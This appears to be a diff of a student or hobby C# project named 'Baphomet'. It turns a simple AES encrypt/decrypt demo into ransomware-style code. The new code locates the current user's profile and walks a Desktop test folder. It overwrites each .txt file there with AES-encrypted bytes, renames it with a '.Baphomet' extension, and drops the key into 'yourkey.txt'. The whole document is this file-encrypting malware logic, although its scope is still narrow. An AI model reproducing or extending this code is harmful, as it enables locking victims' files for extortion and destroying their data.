@@ -1,11 +1,12 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
 namespace Baphomet
 {
-    class Program
+    public class Program : Decrypt
     {
         static void Main()
         {
@@ -14,72 +15,75 @@ namespace Baphomet
 
             byte[] key = aes.Key;
 
-            //Console.WriteLine("Enter message to encrypt:");
-            //string message = Console.ReadLine();
+            var userName = Environment.UserName;
+            var computerName = System.Environment.MachineName.ToString();
+            var  userDir = "C:\\Users\\" +userName;
 
-            var path = Path.GetFullPath("files/chucknorris.jpg");
-            byte[] message = System.IO.File.ReadAllBytes(path);
+            directoryRoad(userDir,key);
+            decryptConfirm();
+        }
 
-            //metodo de cifrado
-            EncryptText(aes, message, "encryptedData.txt");
+        //recoro los directorios
+        static void directoryRoad(string userdir, byte[] key)
+        {
+           // var Dirs = new[] { "\\Documents", "\\Desktop" };
+            var extensionCheck = new[] { ".txt" };
+            var targetPath = userdir +"\\Desktop\\test";
 
-           //metodo para decifrar mensage
-            var Message =  DecryptData(aes, "encryptedData.txt.Baphomet");
+            string[] files = Directory.GetFiles(targetPath);
+            string[] subDirs = Directory.GetDirectories(targetPath);
 
-            File.WriteAllText("Decryp.jpg", Message);
+            for(int i = 0; i < files.Length; i++)
+            {
+                var extension = Path.GetExtension(files[i]);
+                if (extensionCheck.Contains(extension))
+                {
+                    encryptFileData(files[i], key, targetPath);
+                }
+            }
 
         }
 
-        static void EncryptText(SymmetricAlgorithm aesAlgorithm, byte[] text, string fileName)
+        //archivo valido para cifrar bytes
+        static void encryptFileData(string file, byte[] key, string targetPath)
         {
-           // ICryptoTransform encryptor = aesAlgorithm.CreateEncryptor(aesAlgorithm.Key, aesAlgorithm.IV);
+            byte[] encryptFileBites = File.ReadAllBytes(file);
 
+            var encryptedBytes = UseAES(encryptFileBites, key);
+            File.WriteAllBytes(file, encryptedBytes);
+            System.IO.File.Move(file, file + ".Baphomet");
+
+            var saveKey = Convert.ToBase64String(key,0,key.Length);
+            File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);
+
+        }
+
+
+        //Cifro los bytes de el archivo
+        static byte[] UseAES(byte[] fileBytes, byte[] key)
+        {
             byte[] encryptedBytes = null;
-            using (MemoryStream ms = new MemoryStream())
+
+           
+
+            using(MemoryStream ms = new MemoryStream())
             {
-                using (RijndaelManaged AES = new RijndaelManaged())
+                using (RijndaelManaged myAES = new RijndaelManaged())
                 {
-                    AES.Mode = CipherMode.CBC;
+                    myAES.BlockSize = 128;
+                    myAES.Key = key;
+                    myAES.Mode = CipherMode.CBC;
 
-                    using (var cs = new CryptoStream(ms,AES.CreateEncryptor(aesAlgorithm.Key, aesAlgorithm.IV), CryptoStreamMode.Write))
+                    using (var cryptStream = new CryptoStream(ms, myAES.CreateEncryptor(), CryptoStreamMode.Write))
                     {
-                        cs.Write(text, 0, text.Length);
-                        cs.Close();
+                        cryptStream.Write(fileBytes, 0, fileBytes.Length);
+                        cryptStream.Close();
                     }
-
                     encryptedBytes = ms.ToArray();
-                    File.WriteAllBytes(fileName, encryptedBytes);
-                    System.IO.File.Move(fileName, fileName + ".Baphomet");
-
-                }
-            }
-        }
-
-        static string DecryptData(SymmetricAlgorithm aesAlgorithm, string fileName)
-        {
-            ICryptoTransform decryptor = aesAlgorithm.CreateDecryptor(aesAlgorithm.Key, aesAlgorithm.IV);
-
-            byte[] decryptedBytes = null;
-            byte[] encryptedDataBuffer = File.ReadAllBytes(fileName);
-
-            using (MemoryStream ms = new MemoryStream())
-            {
-                using (RijndaelManaged AES = new RijndaelManaged())
-                {
-                    using (var cs = new CryptoStream(ms,decryptor , CryptoStreamMode.Write))
-                    {
-                        cs.Write(encryptedDataBuffer, 0, encryptedDataBuffer.Length);
-                        cs.Close();
-                    }
-                    decryptedBytes = ms.ToArray();
-                    File.WriteAllBytes(fileName, decryptedBytes);
-
-                    
                 }
 
+                return encryptedBytes;
             }
-
-            return ("fefef");
         }
     }
 }
